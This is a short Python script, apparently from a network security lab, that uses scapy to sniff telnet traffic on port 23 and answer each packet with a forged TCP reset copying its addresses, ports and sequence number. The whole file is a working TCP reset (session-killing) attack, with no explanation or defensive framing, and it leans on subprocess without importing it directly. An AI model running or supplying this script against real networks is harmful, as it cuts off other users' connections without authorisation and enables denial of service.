#!/usr/bin/env python3

from scapy.all import *
def spoof(pkt):
    ls(pkt)
    ip = IP()
    ip.dst = pkt[IP].dst
    ip.src = pkt[IP].src
    tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="R", seq=pkt[TCP].seq)
    send(ip/tcp, verbose=0)

def get_iface(dest_ip):
    res = subprocess.run(["ip", "route", "get", dest_ip], capture_output=True, text=True, check=True)
    for token in res.stdout.split():
        if token == "dev":
    	    return res.stdout.split()[res.stdout.split().index("dev") + 1]

capture = sniff(iface=get_iface('10.9.0.5'), filter='tcp and port 23', prn=spoof)